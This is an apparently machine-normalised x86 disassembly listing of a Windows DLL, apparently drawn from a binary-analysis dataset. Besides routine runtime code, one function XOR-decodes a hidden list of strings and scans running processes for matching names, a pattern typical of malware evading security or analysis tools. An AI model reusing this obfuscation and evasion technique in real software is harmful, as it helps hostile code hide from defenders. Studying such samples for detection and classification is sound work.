mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_10027385
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1005c469
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_100063d0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
push eax
push edx
call sub_10012830
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_10006414
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push esi
push edi
mov esi ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
sub eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_10030594
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
lea ebx [ eax + edi ]
push 0x0
push ebx
mov ecx esi
call sub_100056ae
test al al
je r-xdata
pop ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_100064b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000650a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_100190f9
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100650d7
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
sub_100065a0
push ebp
mov ebp esp
sub esp 0x6ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6a8 ] edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x6ac ]
mov eax 0x4
call sub_10028560
lea edx [ ebp - 0x6a4 ]
mov eax 0x1
call sub_10028560
lea edx [ ebp - 0x6a0 ]
xor eax eax
call sub_10028560
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x6a4 ]
push eax
call sub_10050c60
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
jne r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
call sub_10050c60
test eax eax
jne r-xdata
mov edi [ ebp - 0x6a8 ]
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x6ac ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x2
call sub_10028560
push 0x80000002
mov ecx edx
call sub_10011ba0
add esp 0x4
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10006800
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10034100
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10006860
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
call sub_10079170
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
inc [ esi + 0x4 ]
pop esi
pop ebx
pop ebp
retn
sub_10006890
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_100477f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100068b0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edi
call sub_1001f8b0
push 0xffffffff
push 0x0
lea eax [ edi + 0x94 ]
push eax
lea ecx [ esi + 0x94 ]
call sub_1002d970
mov ecx [ edi + 0xb0 ]
mov [ esi + 0xb0 ] ecx
mov edx [ edi + 0x90 ]
mov [ esi + 0x90 ] edx
sub_10006910
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10006970
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov edx [ eax + 0x30 ]
push ebx
push edi
lea ecx [ ebp - 0x44 ]
push ecx
xor edi edi
push esi
xor ebx ebx
mov [ ebp - 0x44 ] edi
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea edx [ ebp - 0x48 ]
push edx
push eax
mov eax [ ecx + 0x50 ]
push esi
mov [ ebp - 0x48 ] edi
call eax
mov eax [ ebp - 0x48 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x115
call sub_1002f620
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ebx 0x4
xor eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x48 ] edi
jmp r-xdata
inc eax
cmp eax 0x18
jb r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10006a59
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1006803e
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10016559
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1002f32c
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_10051220
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1006803e
mov edi [ DecodePointer@IAT ]
push sub_10061657
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_100579de
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_10034468
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_10006be0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ffc
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ebx 0x7
xor edi edi
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
xor ecx ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] cx
xor edx edx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] dx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] ax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] cx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] dx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc0 ] edi
mov [ esi + 0xb0 ] ax
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xdc ] edi
mov [ esi + 0xcc ] cx
lea ecx [ esi + 0xe8 ]
mov [ ebp - 0x4 ] bl
push 0x1
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] dx
call sub_10034100
lea ecx [ esi + 0x104 ]
mov [ ebp - 0x4 ] 0x8
push 0x1
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] ax
call sub_10034100
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
push edi
mov [ esi + 0x13c ] edi
push edi
mov [ esi + 0x140 ] edi
call [ CoInitializeEx@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10006d21
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002d269
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1002d269
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1002d269
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_10032da8
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_10006d73
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10006dac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_1000c580
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10006dcd
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10009917
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10006e80
push ebp
mov ebp esp
sub esp 0x4d4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2f
and edx 0xff
mov [ ebp + eax * 2 - 0x1a8 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x190 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x71
and edx 0xff
mov [ ebp + eax * 2 - 0x220 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x204 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x24c ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x224 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x6c
and edx 0xff
mov [ ebp + eax * 2 - 0x144 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12e ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x41
and edx 0xff
mov [ ebp + eax * 2 - 0x18c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x176 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc4
and edx 0xff
mov [ ebp + eax * 2 - 0x114 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xfe ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x49
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa3
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x53
and edx 0xff
mov [ ebp + eax * 2 - 0x1e0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c6 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc6
and edx 0xff
mov [ ebp + eax * 2 - 0x174 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x15e ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0xcc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0xfc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xe6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2a
and edx 0xff
mov [ ebp + eax * 2 - 0x12c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x116 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffab
and edx 0xff
mov [ ebp + eax * 2 - 0x200 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcd
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x1c4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1ac ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe1
and edx 0xff
mov [ ebp + eax * 2 - 0x15c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x146 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x42 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x54
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x70 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa1
and edx 0xff
mov [ ebp + eax * 2 - 0xe4 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xce ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x30 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff94
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
mov [ ebp - 0xa0 ] ax
lea ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x4d4 ] ecx
lea edx [ ebp - 0x220 ]
mov [ ebp - 0x4d0 ] edx
lea eax [ ebp - 0x24c ]
mov [ ebp - 0x4cc ] eax
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4c8 ] ecx
lea edx [ ebp - 0x18c ]
mov [ ebp - 0x4c4 ] edx
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x4c0 ] eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4bc ] ecx
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x4b8 ] edx
lea eax [ ebp - 0x1e0 ]
mov [ ebp - 0x4b4 ] eax
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x4b0 ] ecx
lea edx [ ebp - 0xcc ]
mov [ ebp - 0x4ac ] edx
lea eax [ ebp - 0xfc ]
mov [ ebp - 0x4a8 ] eax
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4a4 ] ecx
lea edx [ ebp - 0x200 ]
mov [ ebp - 0x4a0 ] edx
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x1c4 ]
lea edx [ ebp - 0x15c ]
mov [ ebp - 0x49c ] eax
mov [ ebp - 0x498 ] ecx
mov [ ebp - 0x494 ] edx
push edi
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x490 ] eax
mov [ ebp - 0x48c ] ecx
mov [ ebp - 0x488 ] edx
push 0x0
lea eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0x40 ]
lea edx [ ebp - 0xb4 ]
push 0x2
mov [ ebp - 0x484 ] eax
mov [ ebp - 0x480 ] ecx
mov [ ebp - 0x47c ] edx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x478 ]
push eax
push edi
mov [ ebp - 0x478 ] 0x22c
call [ Process32FirstW@IAT ]
mov ebx [ CharUpperW@IAT ]
push esi
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x1
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x17
jb r-xdata
mov edx [ ebp + esi * 4 - 0x4d4 ]
push edx
lea eax [ ebp - 0x454 ]
push eax
call sub_1000b388
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x478 ]
push ecx
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x454 ]
push ecx
call ebx
xor esi esi
lea esp [ esp ]
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100074b0
push ebp
mov ebp esp
sub esp 0x68c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi edx
mov [ ebp - 0x684 ] ecx
test esi esi
